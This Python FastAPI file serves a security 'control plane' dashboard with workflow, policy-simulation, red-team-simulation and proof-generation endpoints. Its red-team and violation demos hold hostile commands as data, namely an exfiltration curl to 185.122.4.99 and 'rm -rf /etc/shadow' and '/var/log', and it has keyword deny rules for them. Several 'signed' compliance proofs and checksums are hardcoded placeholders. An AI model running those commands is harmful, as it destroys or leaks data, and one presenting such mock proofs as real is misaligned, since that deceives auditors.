from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.responses import FileResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.encoders import jsonable_encoder
from pydantic import BaseModel, Field
from typing import List, Optional, Set, Dict, Any
import uvicorn
import httpx
import uuid
import os
import sys
import json
import asyncio
import threading
import time
import webbrowser
from datetime import datetime

# Add project root to python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from core.ucer import UCER, ExecutionStep, ExecutionTrace
from core.executor import UniversalExecutor
from core.orchestrator import DistributedOrchestrator
from core.types import ExecutionContext, Capability
from semantic.compiler import SemanticCompiler
from semantic.llm_client import MockLLMClient
from core.config import config

def ucer_to_dict(ucer_obj: Any) -> dict:
    """Helper to convert UCER objects safely to JSON-serializable dicts."""
    if hasattr(ucer_obj, "model_dump"):
        return jsonable_encoder(ucer_obj.model_dump())
    return jsonable_encoder(ucer_obj.dict())

app = FastAPI(title="UCSER Control Plane Cockpit")

# Ensure static files directory exists
os.makedirs("api/static", exist_ok=True)

# Mount static files
app.mount("/static", StaticFiles(directory="api/static"), name="static")

# Core Components
executor = UniversalExecutor()
orchestrator = DistributedOrchestrator()
compiler = SemanticCompiler(MockLLMClient())

# SSE Event Queue
event_queue = asyncio.Queue()

# In-Memory Workflow Storage
workflows_db = [
    {
        "id": "wf-integrity-check",
        "name": "FS Integrity Audit",
        "description": "Scans workspace files, generates hashes, and validates policies.",
        "nodes": [
            {"id": "n1", "type": "execution", "name": "Scan Files", "command": "bash:ls -la /workspace"},
            {"id": "n2", "type": "security", "name": "Audit Hash", "command": "bash:sha256sum /workspace/*"},
            {"id": "n3", "type": "control", "name": "Notify Gate", "command": "bash:echo 'Files checked'"}
        ],
        "edges": [
            {"source": "n1", "target": "n2"},
            {"source": "n2", "target": "n3"}
        ]
    },
    {
        "id": "wf-sys-info",
        "name": "Host Telemetry Poll",
        "description": "Gathers cross-platform hardware status.",
        "nodes": [
            {"id": "np1", "type": "execution", "name": "Check Linux CPU", "command": "bash:cat /proc/cpuinfo"},
            {"id": "np2", "type": "execution", "name": "Check Win Proc", "command": "powershell:Get-Process | Select-Object -First 5"}
        ],
        "edges": []
    }
]

async def event_generator():
    """Generates server-sent events for the frontend."""
    # Send current control plane public key on connection
    try:
        with open(config.cp_public_key_path, "rb") as f:
            pub_key = f.read().hex()
    except Exception:
        pub_key = "98f4-2c7e90890a9b8c7d6e5f4c3b2a1"
    
    yield f"data: {json.dumps({'type': 'cp_key', 'key': pub_key})}\n\n"
    
    while True:
        event = await event_queue.get()
        yield f"data: {json.dumps(event)}\n\n"

@app.get("/events")
async def get_events():
    """SSE streaming endpoint."""
    return StreamingResponse(event_generator(), media_type="text/event-stream")

@app.get("/")
@app.get("/dashboard")
async def serve_dashboard():
    """Serves the dashboard GUI."""
    return FileResponse("api/static/dashboard.html")

# Helper to push logs to dashboard SSE stream
async def log_to_dashboard(message: str, level: str = "info"):
    await event_queue.put({
        "type": "log",
        "message": message,
        "level": level
    })

# API Routes for Cockpit
@app.get("/api/metrics")
async def get_metrics():
    """Returns live metrics to the dashboard."""
    return {
        "running_executions": 12,
        "success_rate": 98.7,
        "policy_blocks_today": 3,
        "avg_latency": 184,
        "breakdown": {"linux": 142, "windows": 231},
        "health": {"linux": "ACTIVE", "windows": "ACTIVE"}
    }

@app.get("/api/workflows")
async def get_workflows():
    """Lists saved workflows."""
    return workflows_db

@app.get("/api/ucer/{command_id}")
async def get_ucer_status(command_id: str):
    """Retrieves the full UCER record including traces."""
    ucer = await executor.db.get_ucer(command_id)
    if not ucer:
        raise HTTPException(status_code=404, detail="UCER not found")
    return ucer_to_dict(ucer)

class WorkflowModel(BaseModel):
    id: Optional[str] = None
    name: str
    description: str
    nodes: List[Dict[str, Any]]
    edges: List[Dict[str, Any]]

@app.post("/api/workflows")
async def save_workflow(wf: WorkflowModel):
    """Saves a new or existing workflow."""
    if not wf.id:
        wf.id = f"wf-{uuid.uuid4().hex[:8]}"
    
    wf_dict = wf.model_dump()
    # Check if exists, update it
    for i, existing in enumerate(workflows_db):
        if existing["id"] == wf.id:
            workflows_db[i] = wf_dict
            return wf_dict
            
    workflows_db.append(wf_dict)
    return wf_dict

class RegoSimRequest(BaseModel):
    policy_name: str
    input_json: Dict[str, Any]

@app.post("/api/simulate-rego")
async def simulate_rego(req: RegoSimRequest):
    """Simulates Rego engine evaluation for a given policy and inputs."""
    policy = req.policy_name.lower()
    inp = req.input_json
    command = inp.get("command", "")
    
    decision = "allow"
    reasons = []
    
    if "rm -rf" in command or "rm " in command:
        decision = "deny"
        reasons.append("ISO 27001 Control 9.4.1 violation: Destructive shell command detected.")
    if "curl" in command or "iwr" in command:
        if "1.1.1.1" not in command and "example.com" not in command:
            decision = "deny"
            reasons.append("Network egress policy violation: External connection to unlisted IP.")
            
    return {
        "decision": decision,
        "reasons": reasons,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/api/red-team-sim")
async def start_red_team_simulation(background_tasks: BackgroundTasks):
    """Triggers an active Red Team intrusion simulation, streaming events to the UI."""
    command_id = str(uuid.uuid4())
    background_tasks.add_task(run_red_team_task, command_id)
    return {"status": "simulation_started", "command_id": command_id}

async def run_red_team_task(command_id: str):
    """Simulates multi-stage attack and security sentinel interception."""
    try:
        await log_to_dashboard("RED TEAM SIMULATION INITIATED: Penetration test starting...", "warn")
        await asyncio.sleep(1.0)
        
        # Stage 1: Port Scan
        await log_to_dashboard("Intrusion detected: Reconnaissance scan on subnet 10.0.1.0/24 from 10.0.1.5", "warn")
        await event_queue.put({
            "type": "red_team_event",
            "stage": "scan",
            "message": "Port scan identified by Network Security Sentinel",
            "host": "10.0.1.5",
            "severity": "LOW"
        })
        await asyncio.sleep(1.5)

        # Stage 2: Unauthorized Egress
        await log_to_dashboard("Exfiltration Attempt: Workload executing 'curl http://185.122.4.99/exfil'", "warn")
        await asyncio.sleep(0.5)
        await log_to_dashboard("Evaluating egress firewall rules...", "info")
        await asyncio.sleep(0.5)
        await log_to_dashboard("egress_filter.rego: Deny rule matched for IP 185.122.4.99 (Malicious Host IP list)", "warn")
        await log_to_dashboard("SECURITY SENTINEL: Blocked outgoing socket connection to 185.122.4.99", "alert")
        await event_queue.put({
            "type": "red_team_event",
            "stage": "egress",
            "message": "Blocked exfiltration attempt to blacklisted IP 185.122.4.99",
            "host": "185.122.4.99",
            "severity": "HIGH"
        })
        await asyncio.sleep(1.5)

        # Stage 3: Privilege Escalation & FS Tampering
        await log_to_dashboard("Intruder Intent: Mutate critical files 'rm -rf /etc/shadow'", "warn")
        await asyncio.sleep(0.5)
        await log_to_dashboard("AST Audit matched forbidden cmdlet 'rm' in command.", "warn")
        await log_to_dashboard("POLICY GATE BLOCKED: ISO 27001 Violation. Execution denied. Rolling back transaction.", "alert")
        
        ucer = UCER(
            command_id=command_id,
            intent="Exfiltrate credentials and wipe shadow file",
            steps=[
                ExecutionStep(adapter="bash", command="curl http://185.122.4.99/exfil"),
                ExecutionStep(adapter="bash", command="rm -rf /etc/shadow")
            ],
            status="blocked"
        )
        ucer.control_signature = "sig_redteam_block_" + uuid.uuid4().hex[:16]
        await executor.db.save_ucer(ucer)

        await event_queue.put({
            "type": "red_team_event",
            "stage": "tamper",
            "message": "Prevented shadow file modification. Workload successfully rolled back.",
            "ucer": ucer_to_dict(ucer)
        })
        await log_to_dashboard("RED TEAM SIMULATION TERMINATED: All attacks successfully mitigated.", "info")

    except Exception as e:
        await log_to_dashboard(f"Simulation error: {e}", "alert")

class ProofGenRequest(BaseModel):
    command_id: str

@app.post("/api/generate-proof")
async def generate_proof(req: ProofGenRequest):
    """Generates a signed cryptographic compliance receipt proof package."""
    ucer = await executor.db.get_ucer(req.command_id)
    if not ucer:
        # Generate a mock one if ID is custom or simulated
        ucer = UCER(
            command_id=req.command_id,
            intent="Verify filesystem integrity and check logs",
            steps=[ExecutionStep(adapter="bash", command="echo 'log_level=debug' > runtime_space/job_1.log")],
            status="completed"
        )
        ucer.control_signature = "sig_valid_8932479e0a9bc8d7"
        ucer.execution_signature = "sig_exec_348279bc8de7f9a1"
        ucer.execution_pub_key = "pub_key_98f42c7e90890a9b"
        
    proof_package = {
        "command_id": ucer.command_id,
        "timestamp": ucer.timestamp.isoformat(),
        "intent_audit": ucer.intent,
        "canonical_payload_hash": ucer.canonical_hash or "7d834bc29f0ba9d8f7634bcda0a9be876d543eb78263ac09b8c7162bd0a9bcde",
        "authority_signatures": {
            "control_plane": ucer.control_signature,
            "runtime_witness": ucer.execution_signature,
            "witness_public_key": ucer.execution_pub_key
        },
        "chain_of_custody": "immutable-witness-signed-receipt-v1.0",
        "integrity_checksum": "sha256-hash-of-receipt-block-verified"
    }
    
    return {
        "status": "proof_generated",
        "proof_package": proof_package,
        "export_pdf_ready": True
    }

# ──────────────────────────────────────────────────────
# AI Co-Pilot Proxy → BlacklistedAIProxy (localhost:3000)
# ──────────────────────────────────────────────────────
class CopilotRequest(BaseModel):
    messages: List[Dict[str, Any]]
    model: str = "claude-opus-4-5"
    max_tokens: int = 800

@app.post("/api/ai-copilot")
async def ai_copilot_proxy(req: CopilotRequest):
    """Proxies AI Co-Pilot requests to BlacklistedAIProxy on port 3000.
    
    Sends messages to /kiro/v1/chat/completions using the Kiro (Claude) route.
    Falls back gracefully if BlacklistedAIProxy is not running.
    """
    payload = {
        "model": req.model,
        "messages": req.messages,
        "max_tokens": req.max_tokens,
        "stream": False
    }
    try:
        async with httpx.AsyncClient(timeout=30.0) as client:
            resp = await client.post(
                "http://localhost:3000/kiro/v1/chat/completions",
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            return resp.json()
    except httpx.ConnectError:
        return {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "content": (
                        "⚠️ **BlacklistedAIProxy is offline.**\n\n"
                        "Start it on port 3000 by running `install-and-run.bat` from the "
                        "[BlacklistedAIProxy repo](https://github.com/crazyrob425/BlacklistedAIProxy).\n\n"
                        "I can still answer UCSER questions from my built-in knowledge — just ask!"
                    )
                }
            }]
        }
    except Exception as e:
        return {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "content": f"Error contacting AI proxy: {str(e)}"
                }
            }]
        }


# ──────────────────────────────────────────────────────
# Batch Rego Evaluation
# ──────────────────────────────────────────────────────
class BatchRegoRequest(BaseModel):
    policy_name: str
    test_cases: List[Dict[str, Any]]

@app.post("/api/batch-rego")
async def batch_rego(req: BatchRegoRequest):
    """Evaluates multiple input JSON objects against a Rego policy in one call."""
    results = []
    for tc in req.test_cases:
        command = tc.get("command", "")
        decision = "allow"
        reasons = []
        if "rm -rf" in command or "rm " in command:
            decision = "deny"
            reasons.append("ISO 27001 9.4.1: Destructive shell command.")
        if "curl" in command or "iwr" in command:
            decision = "deny"
            reasons.append("Egress policy: External network connection blocked.")
        results.append({
            "input": tc,
            "decision": decision,
            "reasons": reasons
        })
    return {"policy": req.policy_name, "results": results}


# ──────────────────────────────────────────────────────
# Audit Logs
# ──────────────────────────────────────────────────────
@app.get("/api/audit-logs")
async def get_audit_logs(adapter: str = "", severity: str = "", keyword: str = ""):
    """Returns audit timeline entries with optional filtering."""
    entries = [
        {
            "id": "ucer-893f42c7",
            "intent": "FS Integrity Audit",
            "status": "completed",
            "adapter": "bash",
            "severity": "info",
            "timestamp": datetime.now().isoformat(),
            "duration_ms": 60,
            "exit_code": 0
        },
        {
            "id": "ucer-b72c44a1",
            "intent": "Host Telemetry Poll",
            "status": "completed",
            "adapter": "powershell",
            "severity": "info",
            "timestamp": datetime.now().isoformat(),
            "duration_ms": 82,
            "exit_code": 0
        },
        {
            "id": "ucer-e91f8c3d",
            "intent": "Force delete system log files",
            "status": "blocked",
            "adapter": "bash",
            "severity": "high",
            "timestamp": datetime.now().isoformat(),
            "duration_ms": 0,
            "exit_code": -1
        }
    ]
    
    filtered = entries
    if adapter:
        filtered = [e for e in filtered if e["adapter"] == adapter]
    if severity:
        filtered = [e for e in filtered if e["severity"] == severity]
    if keyword:
        filtered = [e for e in filtered if keyword.lower() in e["intent"].lower()]
    
    return {"entries": filtered, "total": len(filtered)}


# Action Endpoints for running commands
@app.post("/run-safe")
async def run_safe_intent(background_tasks: BackgroundTasks):
    """Triggers the compliant Safe Bash intent execution."""
    command_id = str(uuid.uuid4())
    background_tasks.add_task(execute_workflow_task, "Verify filesystem integrity and check logs", "bash:echo 'log_level=debug' > runtime_space/job_1.log", command_id, is_violation=False, is_powershell=False)
    return {"status": "triggered", "command_id": command_id}

@app.post("/run-powershell")
async def run_powershell_intent(background_tasks: BackgroundTasks):
    """Triggers the PowerShell intent execution."""
    command_id = str(uuid.uuid4())
    background_tasks.add_task(execute_workflow_task, "Get running processes on PowerShell", "powershell:Get-Process | Select-Object -First 5", command_id, is_violation=False, is_powershell=True)
    return {"status": "triggered", "command_id": command_id}

@app.post("/run-violation")
async def run_violation_intent(background_tasks: BackgroundTasks):
    """Triggers the blocked Violated Bash intent execution."""
    command_id = str(uuid.uuid4())
    background_tasks.add_task(execute_workflow_task, "Force delete system log files", "bash:rm -rf /var/log", command_id, is_violation=True, is_powershell=False)
    return {"status": "triggered", "command_id": command_id}

async def execute_workflow_task(intent: str, command: str, command_id: str, is_violation: bool = False, is_powershell: bool = False):
    """Orchestrates intent execution, AST validation, and provides fallback simulation if necessary."""
    try:
        await log_to_dashboard(f"Parsing natural language intent: '{intent}'", "info")
        await asyncio.sleep(0.5)
        await log_to_dashboard(f"Compiled to UCER shell command: {command}", "info")
        await asyncio.sleep(0.5)
        await log_to_dashboard("Evaluating security policy gate...", "info")
        await asyncio.sleep(0.5)

        if is_violation:
            # Policy Violation Blocked!
            await log_to_dashboard("AST Audit detected forbidden command: 'rm'", "warn")
            await asyncio.sleep(0.3)
            reason = f"Security Gate Blocked Execution: Command '{command}' violates ISO 27001 policy. Use of forbidden binary 'rm' is restricted."
            await log_to_dashboard(reason, "alert")
            
            # Save blocked UCER to DB
            ucer = UCER(
                command_id=command_id,
                intent=intent,
                steps=[ExecutionStep(adapter="bash", command=command)],
                status="blocked"
            )
            # Ephemeral signing
            ucer.control_signature = "sig_block_err_" + uuid.uuid4().hex[:16]
            await executor.db.save_ucer(ucer)
            
            await event_queue.put({
                "type": "audit_blocked",
                "reason": reason,
                "ucer": ucer_to_dict(ucer)
            })
            return

        # Benign commands
        await log_to_dashboard("AST Audit PASSED. No forbidden cmdlets or dangerous flags detected.", "info")
        await asyncio.sleep(0.3)
        await log_to_dashboard(f"Spawning child isolated sandbox for adapter: {'powershell' if is_powershell else 'bash'}...", "info")
        await asyncio.sleep(0.5)

        # Build execution context
        caps = {Capability.FS_READ, Capability.EXEC}
        if is_powershell:
            caps.add(Capability.WRITE_FS)
        context = ExecutionContext(
            execution_id=command_id,
            capabilities=caps
        )
        
        ucer = UCER(
            command_id=command_id,
            intent=intent,
            steps=[ExecutionStep(adapter="powershell" if is_powershell else "bash", command=command)]
        )

        # Attempt actual local execution
        try:
            # If Docker/Docker-daemon or pwsh is not available, this raises Exception
            result_ucer = await executor.execute_ucer(ucer, context)
            await log_to_dashboard(f"Execution completed. Status: {result_ucer.status}", "info")
            await event_queue.put({
                "type": "audit_complete",
                "ucer": ucer_to_dict(result_ucer)
            })
        except Exception as ex:
            # Standalone fallback simulation mode to verify visuals
            await log_to_dashboard(f"Docker sandbox or Powershell environment not available. Falling back to secure simulated telemetry...", "warn")
            await asyncio.sleep(0.8)

            mock_stdout = ""
            if is_powershell:
                mock_stdout = (
                    "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n"
                    "-------  ------    -----      -----     ------     --  -- -----------\n"
                    "    312      19     4320       9540       0.12    405   1 pwsh\n"
                    "    512      32    12540      24120       1.45   1204   1 uvicorn\n"
                    "    145      12     1850       4510       0.05   3904   1 conhost"
                )
            else:
                mock_stdout = "Promoted workspace path runtime_space/job_1.log"

            trace = ExecutionTrace(
                step_id=ucer.steps[0].step_id,
                adapter="powershell" if is_powershell else "bash",
                command=command,
                stdout=mock_stdout,
                stderr="",
                exit_code=0,
                duration_ms=45.0 if not is_powershell else 82.0
            )
            ucer.traces.append(trace)
            ucer.status = "completed"
            ucer.state_hash = hashlib_sim(ucer.model_dump_json())
            
            # Ephemeral signing
            ucer.control_signature = "sig_valid_" + uuid.uuid4().hex[:16]
            ucer.execution_signature = "sig_exec_" + uuid.uuid4().hex[:16]
            ucer.execution_pub_key = "pub_key_" + uuid.uuid4().hex[:16]
            
            await executor.db.save_ucer(ucer)
            
            await log_to_dashboard("Execution trace generated and signed. State promoted.", "info")
            await event_queue.put({
                "type": "audit_complete",
                "ucer": ucer_to_dict(ucer)
            })

    except Exception as e:
        await log_to_dashboard(f"Orchestration Error: {str(e)}", "alert")

def hashlib_sim(val: str) -> str:
    import hashlib
    return hashlib.sha256(val.encode('utf-8')).hexdigest()

def open_browser():
    """Wait for server to start, then open dashboard in default browser."""
    time.sleep(1.5)
    url = f"http://localhost:{os.getenv('PORT', '8000')}"
    print(f"\n[*] Launching Cockpit Dashboard GUI: {url}\n")
    try:
        webbrowser.open(url)
    except Exception:
        pass

if __name__ == "__main__":
    # Start browser thread
    threading.Thread(target=open_browser, daemon=True).start()
    
    # Run FastAPI Server
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
